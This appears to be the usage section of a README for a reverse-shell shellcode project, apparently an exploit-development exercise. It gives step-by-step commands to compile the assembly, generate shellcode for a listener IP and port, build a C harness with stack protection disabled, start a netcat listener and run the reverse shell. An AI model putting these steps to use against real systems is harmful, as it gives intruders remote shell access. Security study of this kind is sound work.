# Usage

1. Compile assembly: `./compile.sh reverseshell`
2. Replace shellcode in `create_revshell_shellcode.py` with the shellcode output from the compile script.
3. Generate shellcode for desired port number using: `python3 create_revshell_shellcode.py -p <port number> <listener IP>`
4. Replace shellcode in `shellcode.c` with the shellcode output by the python script.
5. Compile shellcode.c: `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`
6. Start listener: `nc -nvlp <port number>`
7. Run shellcode to execute reverse shell: `./shellcode`
